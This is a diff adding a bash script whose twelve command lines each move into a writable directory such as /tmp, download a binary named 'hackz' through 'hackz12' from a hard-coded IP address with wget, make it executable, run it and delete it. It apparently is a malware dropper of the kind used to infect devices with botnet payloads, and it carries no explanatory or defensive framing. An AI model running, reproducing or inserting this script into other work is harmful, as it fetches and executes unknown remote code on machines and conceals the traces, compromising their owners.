@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz; chmod +x hackz; ./hackz; rm -rf hackz
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz2; chmod +x hackz2; ./hackz2; rm -rf hackz2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz3; chmod +x hackz3; ./hackz3; rm -rf hackz3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz4; chmod +x hackz4; ./hackz4; rm -rf hackz4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz5; chmod +x hackz5; ./hackz5; rm -rf hackz5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz6; chmod +x hackz6; ./hackz6; rm -rf hackz6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz7; chmod +x hackz7; ./hackz7; rm -rf hackz7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz8; chmod +x hackz8; ./hackz8; rm -rf hackz8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz9; chmod +x hackz9; ./hackz9; rm -rf hackz9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz10; chmod +x hackz10; ./hackz10; rm -rf hackz10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz11; chmod +x hackz11; ./hackz11; rm -rf hackz11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.180/hackz12; chmod +x hackz12; ./hackz12; rm -rf hackz12
